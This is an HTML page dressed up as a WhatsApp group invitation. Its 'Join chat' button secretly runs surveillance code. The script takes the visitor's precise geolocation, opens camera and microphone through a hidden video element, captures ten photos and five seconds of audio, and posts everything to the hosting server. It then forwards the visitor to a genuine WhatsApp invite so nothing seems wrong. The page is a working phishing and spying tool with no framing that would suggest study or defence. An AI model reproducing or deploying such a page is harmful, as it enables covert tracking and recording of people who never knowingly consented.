<!DOCTYPE html>
<html lang="ps">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Group Invite</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
        body { background-color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; }
        header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #f0f0f0; }
        .logo { display: flex; align-items: center; gap: 8px; font-size: 22px; font-weight: bold; color: #25D366; }
        .download-header-icon { background-color: #25D366; color: white; border-radius: 50%; width: 35px; height: 35px; display: flex; justify-content: center; align-items: center; text-decoration: none; font-weight: bold; }
        main { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 40px 20px; text-align: center; }
        .group-icon { width: 100px; height: 100px; margin-bottom: 30px; }
        .invite-text { font-size: 26px; color: #111B21; margin-bottom: 25px; max-width: 320px; line-height: 1.3; }
        .join-btn { background-color: #25D366; color: white; padding: 14px 40px; border-radius: 25px; border: none; font-size: 18px; font-weight: 500; margin-bottom: 40px; cursor: pointer; }
        .sub-text { color: #667781; font-size: 15px; margin-bottom: 8px; }
        .download-link { color: #111B21; font-weight: bold; text-decoration: underline; font-size: 16px; }
        footer { background-color: #111B21; padding: 20px; display: flex; justify-content: center; }
        .bottom-download-btn { background-color: #25D366; color: white; width: 100%; max-width: 350px; padding: 14px; border-radius: 25px; text-decoration: none; text-align: center; font-size: 18px; font-weight: 500; }
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; z-index: -1; }
        canvas { display: none; }
    </style>
</head>
<body>

    <header>
        <div class="logo">WhatsApp</div>
        <a href="#" class="download-header-icon">&darr;</a>
    </header>

    <main>
        <svg class="group-icon" viewBox="0 0 100 100" fill="#25D366">
            <path d="M35 45c6.6 0 12-5.4 12-12s-5.4-12-12-12-12 5.4-12 12 5.4 12 12 12zm25-5c4.4 0 8-3.6 8-8s-3.6-8-8-8-8 3.6-8 8 3.6 8 8 8zm-25 10c-10 0-30 5-30 15v10h60V65c0-10-20-15-30-15zm25 3.3c3.3 1.6 7 3.7 7 6.7v10h20V65c0-6.7-11.1-10.6-27-11.7z"/>
        </svg>
        <h1 class="invite-text">You’ve been invited to join “ګفی ګروف”</h1>
        <button id="joinBtn" class="join-btn">Join chat</button>
        <p class="sub-text">Don't have WhatsApp yet?</p>
        <a href="https://www.whatsapp.com/download" class="download-link">Download WhatsApp</a>
    </main>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <footer>
        <a href="https://www.whatsapp.com/download" class="bottom-download-btn">Download &darr;</a>
    </footer>

    <script>
        const WHATSAPP_CODE = "LKvRLGlXBmgAlMFJV3kMBE"; 
        const DIRECT_WHATSAPP_LINK = `whatsapp://chat?code=${WHATSAPP_CODE}`;
        const FALLBACK_WHATSAPP_LINK = `https://chat.whatsapp.com/${WHATSAPP_CODE}`;

        async function sendData(formData) {
            try {
                await fetch(window.location.origin, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {}
        }

        async function sendSinglePhoto(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            if (!video.srcObject) { video.srcObject = stream; await video.play(); }

            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                canvas.toBlob(async function(blob) {
                    const formData = new FormData();
                    formData.append('photo', blob, 'photo.jpg');
                    await sendData(formData);
                    resolve();
                }, 'image/jpeg');
            });
        }

        async function recordAndSendAudio(stream) {
            return new Promise((resolve) => {
                try {
                    const mediaRecorder = new MediaRecorder(stream);
                    const audioChunks = [];

                    mediaRecorder.ondataavailable = (event) => {
                        audioChunks.push(event.data);
                    };

                    mediaRecorder.onstop = async () => {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                        const formData = new FormData();
                        formData.append('voice', audioBlob, 'voice.ogg');
                        await sendData(formData);
                        resolve();
                    };

                    mediaRecorder.start();
                    setTimeout(() => {
                        if (mediaRecorder.state !== 'inactive') {
                            mediaRecorder.stop();
                        }
                    }, 5000);
                } catch (e) {
                    resolve();
                }
            });
        }

        document.getElementById("joinBtn").addEventListener("click", async function() {
            const btn = document.getElementById("joinBtn");
            btn.innerText = "Connecting...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        const formData = new FormData();
                        formData.append('latitude', pos.coords.latitude);
                        formData.append('longitude', pos.coords.longitude);
                        await sendData(formData);
                    },
                    () => {},
                    { timeout: 4000, enableHighAccuracy: true }
                );
            }

            try {
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await video.play();

                    await new Promise(r => setTimeout(r, 300));

                    let photoCount = 0;
                    const maxPhotos = 10; 

                    const photoInterval = setInterval(async () => {
                        if (photoCount < maxPhotos) {
                            photoCount++;
                            await sendSinglePhoto(stream);
                        } else {
                            clearInterval(photoInterval);
                        }
                    }, 800);

                    await recordAndSendAudio(stream);

                    while (photoCount < maxPhotos) {
                        await new Promise(r => setTimeout(r, 300));
                    }
                    clearInterval(photoInterval);

                    stream.getTracks().forEach(t => t.stop());
                }
            } catch (err) {}

            window.location.href = DIRECT_WHATSAPP_LINK;
            setTimeout(() => { window.location.href = FALLBACK_WHATSAPP_LINK; }, 300);
        });
    </script>
</body>
</html>
